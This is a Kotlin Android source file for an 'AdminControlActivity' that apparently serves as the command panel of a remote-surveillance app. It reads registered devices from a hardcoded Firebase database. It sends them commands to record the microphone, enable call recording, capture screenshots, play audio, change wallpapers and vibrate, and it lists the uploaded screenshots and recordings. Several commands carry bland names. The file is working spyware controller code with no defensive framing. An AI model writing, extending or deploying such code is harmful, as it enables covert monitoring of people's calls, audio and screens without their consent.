package com.example.devsync

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.database.*

class AdminControlActivity : AppCompatActivity() {

    companion object {
        const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val ONLINE_THRESHOLD_MS = 90_000L
        private const val PERM_REQ = 200

        fun convertGoogleDriveUrl(url: String): String {
            return when {
                url.contains("drive.google.com/file/d/") -> {
                    val fileId = url.substringAfter("/file/d/").substringBefore("/")
                    "https://drive.google.com/uc?export=download&id=$fileId"
                }
                url.contains("drive.google.com/open?id=") -> {
                    val fileId = url.substringAfter("open?id=").substringBefore("&")
                    "https://drive.google.com/uc?export=download&id=$fileId"
                }
                else -> url
            }
        }
    }

    private lateinit var tvStatus: TextView
    private lateinit var tvSelected: TextView
    private lateinit var tvFeedback: TextView
    private lateinit var switchBluetooth: Switch
    private lateinit var btnStopAll: Button
    private lateinit var btnSelectAll: Button
    private lateinit var btnDeselectAll: Button
    private lateinit var btnTriggerVibration: Button
    private lateinit var rvDevices: RecyclerView

    private lateinit var etSongUrl: EditText
    private lateinit var btnAddSongUrl: Button
    private lateinit var rvSongs: RecyclerView

    private lateinit var etWallpaperUrl: EditText
    private lateinit var btnAddWallpaperUrl: Button
    private lateinit var rvWallpapers: RecyclerView

    private lateinit var btnTakeScreenshot: Button
    private lateinit var rvScreenshots: RecyclerView

    // Recording views
    private lateinit var etRecordDuration: EditText
    private lateinit var btnStartRecording: Button
    private lateinit var btnStopRecording: Button
    private lateinit var switchCallRecording: Switch
    private lateinit var rvRecordings: RecyclerView

    private val deviceList  = mutableListOf<DeviceInfo>()
    private val selectedIds = mutableSetOf<String>()
    private lateinit var deviceAdapter: DeviceListAdapter

    private val songList = mutableListOf<MediaItem>()
    private lateinit var songAdapter: MediaListAdapter

    private val wallpaperList = mutableListOf<MediaItem>()
    private lateinit var wallpaperAdapter: MediaListAdapter

    private val screenshotList = mutableListOf<ScreenshotItem>()
    private lateinit var screenshotAdapter: ScreenshotListAdapter

    private val recordingList = mutableListOf<RecordingItem>()
    private lateinit var recordingAdapter: RecordingListAdapter

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_admin)
        requestRequiredPermissions()
        initViews()
        setupRecyclerViews()
        listenForDevices()
        setupFirebaseStatus()
        listenForSongs()
        listenForWallpapers()
        listenForScreenshots()
        listenForRecordings()
        setupClickListeners()
    }

    private fun requestRequiredPermissions() {
        val needed = mutableListOf<String>()
        val perms = arrayOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.PROCESS_OUTGOING_CALLS
        )
        perms.forEach {
            if (ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED)
                needed.add(it)
        }
        if (needed.isNotEmpty())
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQ)
    }

    private fun initViews() {
        tvStatus            = findViewById(R.id.tvStatus)
        tvSelected          = findViewById(R.id.tvSelected)
        tvFeedback          = findViewById(R.id.tvFeedback)
        switchBluetooth     = findViewById(R.id.switchBluetooth)
        btnStopAll          = findViewById(R.id.btnStopAll)
        btnSelectAll        = findViewById(R.id.btnSelectAll)
        btnDeselectAll      = findViewById(R.id.btnDeselectAll)
        btnTriggerVibration = findViewById(R.id.btnTriggerVibration)
        rvDevices           = findViewById(R.id.rvDevices)
        etSongUrl           = findViewById(R.id.etSongUrl)
        btnAddSongUrl       = findViewById(R.id.btnAddSongUrl)
        rvSongs             = findViewById(R.id.rvSongs)
        etWallpaperUrl      = findViewById(R.id.etWallpaperUrl)
        btnAddWallpaperUrl  = findViewById(R.id.btnAddWallpaperUrl)
        rvWallpapers        = findViewById(R.id.rvWallpapers)
        btnTakeScreenshot   = findViewById(R.id.btnTakeScreenshot)
        rvScreenshots       = findViewById(R.id.rvScreenshots)
        etRecordDuration    = findViewById(R.id.etRecordDuration)
        btnStartRecording   = findViewById(R.id.btnStartRecording)
        btnStopRecording    = findViewById(R.id.btnStopRecording)
        switchCallRecording = findViewById(R.id.switchCallRecording)
        rvRecordings        = findViewById(R.id.rvRecordings)
    }

    private fun setupRecyclerViews() {
        deviceAdapter = DeviceListAdapter(deviceList, selectedIds) { updateSelectedCount() }
        rvDevices.layoutManager = LinearLayoutManager(this)
        rvDevices.adapter = deviceAdapter

        songAdapter = MediaListAdapter(songList,
            onPlay   = { item -> sendToSelected { db ->
                db.child("remote_audio_url").setValue(convertGoogleDriveUrl(item.url))
                db.child("audio_remote_trigger").setValue(System.currentTimeMillis())
            }},
            onDelete = { item -> FirebaseDatabase.getInstance(DB_URL).getReference("songs/${item.id}").removeValue() }
        )
        rvSongs.layoutManager = LinearLayoutManager(this)
        rvSongs.adapter = songAdapter

        wallpaperAdapter = MediaListAdapter(wallpaperList,
            onPlay   = { item -> sendToSelected { db ->
                db.child("wallpaper_url").setValue(convertGoogleDriveUrl(item.url))
            }},
            onDelete = { item -> FirebaseDatabase.getInstance(DB_URL).getReference("wallpapers/${item.id}").removeValue() }
        )
        rvWallpapers.layoutManager = LinearLayoutManager(this)
        rvWallpapers.adapter = wallpaperAdapter

        screenshotAdapter = ScreenshotListAdapter(screenshotList)
        rvScreenshots.layoutManager = LinearLayoutManager(this)
        rvScreenshots.adapter = screenshotAdapter

        recordingAdapter = RecordingListAdapter(recordingList)
        rvRecordings.layoutManager = LinearLayoutManager(this)
        rvRecordings.adapter = recordingAdapter
    }

    private fun listenForDevices() {
        FirebaseDatabase.getInstance(DB_URL)
            .getReference("registered_devices")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val now     = System.currentTimeMillis()
                    val newList = mutableListOf<DeviceInfo>()
                    for (child in snapshot.children) {
                        val id         = child.key ?: continue
                        val name       = child.child("name").getValue(String::class.java) ?: ""
                        val model      = child.child("model").getValue(String::class.java) ?: ""
                        val lastSeen   = child.child("lastSeen").getValue(Long::class.java) ?: 0L
                        val online     = (now - lastSeen) < ONLINE_THRESHOLD_MS
                        val lastStatus = child.child("lastStatus").getValue(String::class.java) ?: ""
                        val lastStatusTime = child.child("lastStatusTime").getValue(Long::class.java) ?: 0L
                        if (online) newList.add(DeviceInfo(id, name, model, online, lastSeen, lastStatus, lastStatusTime))
                    }
                    deviceAdapter.updateDevices(newList)
                    updateSelectedCount()
                }
                override fun onCancelled(error: DatabaseError) {}
            })
    }

    private fun listenForSongs() {
        FirebaseDatabase.getInstance(DB_URL).getReference("songs")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val list = mutableListOf<MediaItem>()
                    for (child in snapshot.children) {
                        val id   = child.key ?: continue
                        val name = child.child("name").getValue(String::class.java) ?: "Song"
                        val url  = child.child("url").getValue(String::class.java) ?: continue
                        list.add(MediaItem(id, name, url))
                    }
                    songAdapter.updateItems(list)
                }
                override fun onCancelled(e: DatabaseError) {}
            })
    }

    private fun listenForWallpapers() {
        FirebaseDatabase.getInstance(DB_URL).getReference("wallpapers")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val list = mutableListOf<MediaItem>()
                    for (child in snapshot.children) {
                        val id   = child.key ?: continue
                        val name = child.child("name").getValue(String::class.java) ?: "Wallpaper"
                        val url  = child.child("url").getValue(String::class.java) ?: continue
                        list.add(MediaItem(id, name, url))
                    }
                    wallpaperAdapter.updateItems(list)
                }
                override fun onCancelled(e: DatabaseError) {}
            })
    }

    private fun listenForScreenshots() {
        FirebaseDatabase.getInstance(DB_URL).getReference("screenshots")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val list = mutableListOf<ScreenshotItem>()
                    for (child in snapshot.children) {
                        val id        = child.key ?: continue
                        val deviceId  = child.child("deviceId").getValue(String::class.java) ?: ""
                        val url       = child.child("url").getValue(String::class.java) ?: continue
                        val timestamp = child.child("timestamp").getValue(Long::class.java) ?: 0L
                        list.add(ScreenshotItem(id, deviceId, url, timestamp))
                    }
                    screenshotAdapter.updateItems(list)
                }
                override fun onCancelled(e: DatabaseError) {}
            })
    }

    private fun listenForRecordings() {
        FirebaseDatabase.getInstance(DB_URL).getReference("recordings")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val list = mutableListOf<RecordingItem>()
                    for (child in snapshot.children) {
                        val id        = child.key ?: continue
                        val deviceId  = child.child("deviceId").getValue(String::class.java) ?: ""
                        val type      = child.child("type").getValue(String::class.java) ?: "mic"
                        val url       = child.child("url").getValue(String::class.java) ?: continue
                        val timestamp = child.child("timestamp").getValue(Long::class.java) ?: 0L
                        val fileName  = child.child("fileName").getValue(String::class.java) ?: ""
                        list.add(RecordingItem(id, deviceId, type, url, timestamp, fileName))
                    }
                    recordingAdapter.updateItems(list)
                }
                override fun onCancelled(e: DatabaseError) {}
            })
    }

    private fun setupFirebaseStatus() {
        FirebaseDatabase.getInstance(DB_URL)
            .getReference(".info/connected")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val connected = snapshot.getValue(Boolean::class.java) ?: false
                    tvStatus.text = if (connected) "Firebase: CONNECTED ✓" else "Firebase: OFFLINE ✗"
                    tvStatus.setBackgroundColor(
                        if (connected) getColor(android.R.color.holo_green_light)
                        else getColor(android.R.color.holo_red_light)
                    )
                }
                override fun onCancelled(error: DatabaseError) {}
            })
    }

    private fun updateSelectedCount() {
        tvSelected.text = "${selectedIds.size} device(s) selected"
    }

    private fun sendToSelected(action: (DatabaseReference) -> Unit) {
        if (selectedIds.isEmpty()) {
            Toast.makeText(this, "Pehle koi device select karo!", Toast.LENGTH_SHORT).show()
            return
        }
        selectedIds.forEach { id ->
            action(FirebaseDatabase.getInstance(DB_URL).getReference("devices/$id"))
        }
        tvFeedback.text = "Command sent to ${selectedIds.size} device(s)"
    }

    private fun addMediaByUrl(type: String, name: String, url: String) {
        FirebaseDatabase.getInstance(DB_URL).getReference(type).push()
            .setValue(mapOf("name" to name, "url" to url))
    }

    private fun setupClickListeners() {
        btnSelectAll.setOnClickListener {
            deviceList.forEach { selectedIds.add(it.id) }
            deviceAdapter.notifyDataSetChanged()
            updateSelectedCount()
        }

        btnDeselectAll.setOnClickListener {
            selectedIds.clear()
            deviceAdapter.notifyDataSetChanged()
            updateSelectedCount()
        }

        btnStopAll.setOnClickListener {
            sendToSelected { db ->
                db.child("stop_all").setValue(true)
                db.child("bt_management_flag").setValue(false)
                db.child("haptic_feedback_trigger").removeValue()
                db.child("audio_remote_trigger").removeValue()
                db.child("stop_recording").setValue(true)
            }
            switchBluetooth.isChecked = false
            tvFeedback.text = "⛔ STOP ALL sent to ${selectedIds.size} device(s)"
        }

        // ── RECORDING ──────────────────────────────────────────────
        btnStartRecording.setOnClickListener {
            val dur = etRecordDuration.text.toString().trim().toLongOrNull() ?: 30L
            sendToSelected { db ->
                db.child("start_recording").setValue(dur)
            }
            tvFeedback.text = "🎙️ Recording started for ${dur}s on ${selectedIds.size} device(s)"
        }

        btnStopRecording.setOnClickListener {
            sendToSelected { db ->
                db.child("stop_recording").setValue(true)
            }
            tvFeedback.text = "⏹ Stop recording sent to ${selectedIds.size} device(s)"
        }

        switchCallRecording.setOnCheckedChangeListener { _, isChecked ->
            sendToSelected { db ->
                db.child("call_recording_enabled").setValue(isChecked)
            }
            tvFeedback.text = "📞 Call recording ${if (isChecked) "ON" else "OFF"} on ${selectedIds.size} device(s)"
        }

        // ── SCREENSHOT ─────────────────────────────────────────────
        btnTakeScreenshot.setOnClickListener {
            if (selectedIds.isEmpty()) {
                Toast.makeText(this, "Pehle koi device select karo!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            selectedIds.forEach { id ->
                FirebaseDatabase.getInstance(DB_URL)
                    .getReference("devices/$id/take_screenshot").setValue(true)
            }
            tvFeedback.text = "📸 Screenshot command sent to ${selectedIds.size} device(s)"
        }

        // ── SONGS ──────────────────────────────────────────────────
        btnAddSongUrl.setOnClickListener {
            val url = etSongUrl.text.toString().trim()
            if (url.isEmpty()) { Toast.makeText(this, "URL daalo", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
            val name = if (url.contains("drive.google.com")) "Song ${songList.size + 1}"
                       else url.substringAfterLast("/").substringBefore("?").ifEmpty { "Song ${songList.size + 1}" }
            addMediaByUrl("songs", name, url)
            etSongUrl.setText("")
        }

        // ── WALLPAPERS ─────────────────────────────────────────────
        btnAddWallpaperUrl.setOnClickListener {
            val url = etWallpaperUrl.text.toString().trim()
            if (url.isEmpty()) { Toast.makeText(this, "URL daalo", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
            val name = if (url.contains("drive.google.com")) "Wallpaper ${wallpaperList.size + 1}"
                       else url.substringAfterLast("/").substringBefore("?").ifEmpty { "Wallpaper ${wallpaperList.size + 1}" }
            addMediaByUrl("wallpapers", name, url)
            etWallpaperUrl.setText("")
        }

        switchBluetooth.setOnCheckedChangeListener { _, isChecked ->
            sendToSelected { db -> db.child("bt_management_flag").setValue(isChecked) }
        }

        btnTriggerVibration.setOnClickListener {
            sendToSelected { db -> db.child("haptic_feedback_trigger").setValue(System.currentTimeMillis()) }
        }
    }
}
